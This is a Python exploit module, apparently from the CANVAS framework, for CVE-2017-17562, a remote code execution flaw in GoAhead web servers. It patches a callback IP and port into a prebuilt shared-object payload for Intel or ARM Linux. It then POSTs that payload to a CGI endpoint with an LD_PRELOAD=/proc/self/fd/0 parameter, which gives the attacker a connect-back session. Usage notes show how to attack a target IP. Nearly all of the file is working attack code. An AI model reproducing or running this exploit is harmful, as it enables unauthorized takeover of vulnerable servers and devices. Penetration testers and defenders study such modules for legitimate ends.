#!/usr/bin/env python

import sys

if '.' not in sys.path:
    sys.path.append('.')

import os
import copy
import time
import socket
import select
import errno
import struct
import random
import logging

import struct
import socket
import binascii

import canvasengine
import libs.spkproxy as spkproxy

from exploitutils import *
from tcpexploit import tcpexploit


NAME                            = 'GoAhead < 3.6.5 Remote Code Exec'
DESCRIPTION                     = 'Initializing environment using untrusted HTTP request'
VERSION                         = '0.1'

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'EmbedThis Software'
DOCUMENTATION['Repeatability']  = 'Unlimited'
DOCUMENTATION["CVE Name"]       = 'CVE-2017-17562'
DOCUMENTATION["CVE Url"]        = 'https://nvd.nist.gov/vuln/detail/CVE-2017-17562'
DOCUMENTATION["References"]     = 'https://www.elttam.com.au/blog/goahead/'

PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Remote'
PROPERTY["ARCH"]                = [ ["Linux"] ]
PROPERTY["VERSION"]             = [ "All" ]

NOTES = """

To get a node:
./commandlineInterface.py -v 12 -p 5555
./exploits/remote/unix/goahead_env_rce/goahead_env_rce.py -t 192.168.1.181 -l 192.168.1.182 -d 5555

TODO:
- Find CGI logic
- Test phase
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name           = NAME
        self.host           = '127.0.0.1'
        self.port           = 80
        self.protocol       = "http"
        self.debug          = False
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')
        self.template64     = os.path.join(self.local_res, "template64.so")
        self.template32     = os.path.join(self.local_res, "template32.so")
        self.template_arm_32= os.path.join(self.local_res, "template_arm_32.so")

        self.template       = self.template64
        self.ssl            = False
        self.cgipath        = "/cgi-bin/cgitest"

        #
        # Supported ARCHs
        #  0 = INTEL64
        #  1 = INTEL32
        #  2 = ARM32
        #
        self.target_arch    = 0

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def get_args(self):
        self.host           = self.target.interface
        self.port           = int(self.argsDict.get('port', self.port))
        self.cgipath        = self.argsDict.get("basepath", self.cgipath)
        self.ssl            = self.argsDict.get("ssl", self.ssl)
        self.target_arch    = int(self.argsDict.get('version', self.target_arch))

        if self.target_arch == 0:
            logging.info("Targeting 64bit INTEL")
            self.template = self.template64
        elif self.target_arch == 1:
            logging.info("Targeting 32bit INTEL")
            self.template = self.template32
        elif self.target_arch == 2:
            logging.info("Targeting 32bit ARM")
            self.template = self.template_arm_32

        if self.ssl:
            self.protocol = "https"

        f = open(self.template)
        self.payload = f.read()
        f.close()

        return

    def test(self):
        self.get_args()
        return 1

    def prepare_payload(self):
        # CBACK PORT
        self.payload = self.payload.replace("\xFF\xCA", struct.pack("<H", self.callback.port))
        # CBACK IP
        ip = int(binascii.hexlify(socket.inet_aton(self.callback.ip)), 16)
        self.payload = self.payload.replace("\xBA\xBA\xFE\xCA", struct.pack("I", ip))

        # MOSDEF_TYPE/ID
        if self.target_arch == 0:
            mosdef_type = self.engine.getMosdefType(canvasengine.LINUXMOSDEF_X64)
        elif self.target_arch == 1:
            mosdef_type = self.engine.getMosdefType(canvasengine.LINUXMOSDEF_INTEL)
        elif self.target_arch == 2:
            mosdef_type = self.engine.getMosdefType(canvasengine.LINUXMOSDEF_ARM9)
        else:
            logging.critical("Unsupported arch provided")
            return False

        mosdef_id = self.engine.getNewMosdefID(self)

        self.payload = self.payload.replace("\xBC\xBA\xFE\xCA", struct.pack("I", mosdef_type))
        self.payload = self.payload.replace("\xBD\xBA\xFE\xCA", struct.pack("I", mosdef_id))

        return True

    def run(self):
        self.get_args()
        self.setProgress(0)

        if not self.prepare_payload():
            logging.error("Error while preparing our payload")
            return False

        self.setProgress(50)

        url = (self.protocol + "://" + self.target.interface + ":%s" % self.port) + self.cgipath + "?LD_PRELOAD=/proc/self/fd/0"
        (res, response_code) = spkproxy.urlopen(url, data=self.payload, exploit=self,
                                                entireresponse=True, return_response_code=True, verb="POST")
        self.setProgress(80)

        # XXX: timeout on INTEL 64
        response = res.read()
        # if response_code == 200:
        ret = self.ISucceeded()
        if ret:
            logging.warning("Exploit succeeded")
            self.setInfo("%s attacking %s:%d - done (SUCCESS)" % (NAME, self.host, self.port))
            self.setProgress(100)

            return True
        else:
            logging.error("Exploit failed")
            self.setInfo("%s attacking %s:%d - done (FAILED)" % (NAME, self.host, self.port))
            self.setProgress(-1)

        return False


if __name__ == '__main__':
    logging.info('Running CANVAS %s Exploit v%s' % (DESCRIPTION, VERSION))
    app = theexploit()
    try:
        ret = standard_callback_commandline(app)
    except KeyboardInterrupt:
        pass
    if ret not in [0, 1, None] and hasattr(ret, 'interact'):
        ret.interact()
